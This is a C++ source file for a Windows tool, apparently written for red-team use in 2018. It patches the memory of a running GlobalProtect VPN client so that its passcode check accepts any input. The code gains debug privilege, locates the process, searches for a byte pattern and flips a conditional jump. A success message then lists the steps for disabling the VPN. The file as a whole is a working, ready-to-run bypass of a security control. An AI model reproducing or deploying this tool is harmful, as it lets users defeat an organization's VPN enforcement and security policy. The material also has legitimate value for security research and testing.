/*
 * Global Protect VPN Application patcher allowing the 
 * Administrator user to disable VPN without Passcode.
 *
 * It does this by patching process memory and thus allowing to 
 * disable VPN without entering proper password.
 * 
 * Tested on: 
 *	GlobalProtect client 3.1.6.19
 *	Palo Alto Networks 
 *
 * Mariusz B. / mgeeky, '18
**/

#include "windows.h"
#include <iostream>
#include <sstream>
#include <tlhelp32.h>

using namespace std;

#define _DEBUG

const wchar_t *processName = L"PanGPA.exe";

/*
00007FF621B7D02A | 85 C0                              | test    eax, eax                              |
00007FF621B7D02C | 78 61                              | js      pangpa.7FF621B7D08F                   |
00007FF621B7D02E | 48 8B CB                           | mov     rcx, rbx                              |
00007FF621B7D031 | E8 7A 00 00 00                     | call    pangpa.7FF621B7D0B0                   |
00007FF621B7D036 | 85 C0                              | test    eax, eax                              |
00007FF621B7D038 | 75 55                              | jne     pangpa.7FF621B7D08F 
					^--- This is byte to be patched.
*/
const BYTE patternToFind[] = {
	0x85, 0xC0, 0x78, 0x61, 0x48, 0x8B, 0xCB, 0xE8, 
	0x7A, 0x00, 0x00, 0x00, 0x85, 0xC0
};

// jne     pangpa.7FF621B7D08F
const BYTE bytesToBeReplaced[] = {
	0x75, 0x55
};

// je      pangpa.7FF621B7D08F
const BYTE replacingBytes[] = {
	0x74, 0x55
};

struct moduleInfo {
	UINT64 baseAddr;
	DWORD baseSize;
};

bool alreadyPatched = false;


void dbg(const wchar_t * format, ...) {
	wchar_t buffer[4096];
 	va_list args;
  	va_start (args, format);
  	vswprintf (buffer,format, args);

  	wcout << L"[dbg] " << buffer << endl;
  	va_end (args);
}

void msg(const wchar_t * format, ...) {
	wchar_t buffer[4096];
 	va_list args;
  	va_start (args, format);
  	vswprintf (buffer,format, args);

  	MessageBoxW(NULL, buffer, L"GlobalProtectDisable", 0);
  	va_end (args);
}

BOOL setPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
){
  
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if ( !LookupPrivilegeValue( 
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid ) )        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.
    if ( !AdjustTokenPrivileges(
           hToken, 
           FALSE, 
           &tp, 
           sizeof(TOKEN_PRIVILEGES), 
           (PTOKEN_PRIVILEGES) NULL, 
           (PDWORD) NULL) ){ 
        printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
        return FALSE; 
    } 

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED){
          printf("The token does not have the specified privilege. \n");
          return FALSE;
    } 

    return TRUE;
}

DWORD findProcess(const wchar_t *procname) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnapshot) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);

        if(Process32FirstW(hSnapshot, &pe32)) {
            do {
               	if (wcsicmp(procname, pe32.szExeFile) == 0) {
               		return pe32.th32ProcessID;
               	}
            } while(Process32NextW(hSnapshot, &pe32));
         }
         CloseHandle(hSnapshot);
    }

	return 0;
}

BOOL getProcessModule(
	const wchar_t * modName, 
	DWORD pid, 
	struct moduleInfo *out
) {
	dbg(L"PID = %d", pid);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    
    if(hSnapshot != INVALID_HANDLE_VALUE) {
        MODULEENTRY32W me32;
        me32.dwSize = sizeof(MODULEENTRY32W);

        if(Module32FirstW(hSnapshot, &me32)) {
            do {
            	dbg(L"Module name: %ls", me32.szModule);

               	if (wcsicmp(modName, me32.szModule) == 0) {
               		memset(out, 0, sizeof(struct moduleInfo));

               		out->baseAddr = (UINT64)me32.modBaseAddr;
               		out->baseSize = me32.modBaseSize;

               		return true;
               	}
            } while(Module32NextW(hSnapshot, &me32));
         }
         else {
         	dbg(L"Module32FirstW failed.");
         }

         CloseHandle(hSnapshot);
    }
    else {
    	dbg(L"CreateToolhelp32Snapshot failed.");
    }

    return false;
}

BOOL patchProcessMemory(
	const wchar_t * procName,
	DWORD pid,
	HANDLE hProcess,
	const BYTE * patternToFind,
	size_t patternToFindNum,
	const BYTE * bytesToBeReplaced,
	size_t bytesToBeReplacedNum,
	const BYTE * replacingBytes,
	size_t replacingBytesNum
) {

	struct moduleInfo mod;
	if (!getProcessModule(procName, pid, &mod)) {
		dbg(L"Could not find process module. Error: %d", GetLastError());
		return false;
	}

	dbg(L"Module base: %llx, module size: %d", mod.baseAddr, mod.baseSize);

	BYTE page[4096];

	SIZE_T fetched = 0;
	UINT64 addr = mod.baseAddr;

	while( fetched < mod.baseSize) {
		memset(page, 0, sizeof(page));

		SIZE_T out = 0;

		if(ReadProcessMemory(
			hProcess,
			reinterpret_cast<LPCVOID>(addr),
			page,
			sizeof(page),
			&out
		)) {

			UINT64 foundAddr = 0;

			for(size_t m = 0; m < sizeof(page); m++) {
				if (page[m] == patternToFind[0]) {
					bool found = true;
					for(size_t n = 0; n < patternToFindNum; n++) {
						if(page[m + n] != patternToFind[n]) {
							found = false;
							break;
						}
					}

					if(found) {
						dbg(L"Found pattern at: %016llx: %x, %x, %x, %x, %x, %x, %x, %x, ...",
							addr + m,
							page[m + 0],
							page[m + 1],
							page[m + 2],
							page[m + 3],
							page[m + 4],
							page[m + 5],
							page[m + 6],
							page[m + 7]
						);

						for(size_t n = 0; n < bytesToBeReplacedNum; n++) {
							if(page[m + patternToFindNum + n] != bytesToBeReplaced[n]) {
								found = false;

								if ( page[m + patternToFindNum + n] == replacingBytes[n]) {
									msg(L"Process is already patched.\nNo need to do it again.");
									alreadyPatched = true;
									return false;
								}

								dbg(L"Assuring pattern failed at byte %d: %x -> %x",
									n,page[m + patternToFindNum + n], bytesToBeReplaced[n] );
								break;
							}
						}

						if(found) {
							foundAddr = addr + m + patternToFindNum;
							dbg(L"Found pattern at: 0x%llx", foundAddr);
							break;
						}
					}
				}
			}

			if (foundAddr) {
				dbg(L"Starting patching process from address: %016llx", foundAddr);
				out = 0;

				if(WriteProcessMemory(
					hProcess,
					reinterpret_cast<LPVOID>(foundAddr),
					replacingBytes,
					replacingBytesNum,
					&out
				)) {
					dbg(L"Process has been patched, written: %d bytes.", out);
					return true;
				}

				dbg(L"Process patching failed.");
				return false;
			}

			fetched += out;
			addr += out;
		}
	}

	return false;
}

int CALLBACK WinMain(
  HINSTANCE hInstance,
  HINSTANCE hPrevInstance,
  LPSTR     lpCmdLine,
  int       nCmdShow
) {

	HANDLE hToken = NULL;

	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)){
        msg(L"OpenProcessToken() failed, error %u\n", GetLastError());
        return 0;
    }

	if(!setPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
        msg(L"Failed to enable privilege, error %u\n", GetLastError());
        return 0;
    }

	DWORD pid = findProcess(processName);
	if (!pid) {
		msg(L"Could not find GlobalProtect process.");
		return 0;
	}

	dbg(L"Found PanGPA process: %d", pid);
	
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess) {
		msg(L"Could not open GlobalProtect process. Error: %d", GetLastError());
		return 0;
	}

	dbg(L"Opened process handle.");

	BOOL ret = patchProcessMemory(
		processName,
		pid,
		hProcess,
		patternToFind,
		sizeof(patternToFind),
		bytesToBeReplaced,
		sizeof(bytesToBeReplaced),
		replacingBytes,
		sizeof(replacingBytes)
	);

	if(!ret) {
		if(!alreadyPatched) {
			msg(L"Could not patch the process. Error: %d", GetLastError());
		}
	}
	else {
		msg(L"Successfully patched the process! :-)\nNow, in order to bypass GlobalProtect - do the following:\n\t1. Right click on GlobalProtect Tray-icon\n\t2. Select 'Disable'\n\t3. In 'Passcode' input field enter whatever you like.\n\t4. Press OK.\n\nThe GlobalProtect should disable itself cleanly.\n\nHave fun!");
	}

	dbg(L"Closing process handle.");
	CloseHandle(hProcess);
	return 0;
}